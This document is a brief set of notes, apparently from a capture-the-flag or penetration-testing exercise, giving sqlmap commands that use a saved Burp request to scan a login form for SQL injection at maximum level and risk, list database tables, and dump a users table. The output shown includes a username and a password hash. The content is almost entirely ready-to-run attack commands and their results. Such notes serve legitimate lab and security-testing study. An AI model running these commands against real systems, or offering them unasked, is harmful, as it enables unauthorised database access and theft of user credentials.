# SQLMap

Simple initial scan using request file saved from Burp:

```
sqlmap -r login.req --level=5 --risk=3
```

List tables and add more threads to speed up:

```
sqlmap -r login.req --level=5 --risk=3 --tables --dbms=SQLite --threads 10
```

Dump all rows from table users:

```
sqlmap -r login.req --level=5 --risk=3 -T users --dump --dbms=SQLite --threads=10

Table: users
[1 entry]
+----+---+--------+----------+----------------------------------+
| id | 1 | active | username | password                         |
+----+---+--------+----------+----------------------------------+
| 1  | 1 | 1      | RickA    | fdc8cd4cff2c19e0d1022e78481ddf36 |
+----+---+--------+----------+----------------------------------+
```
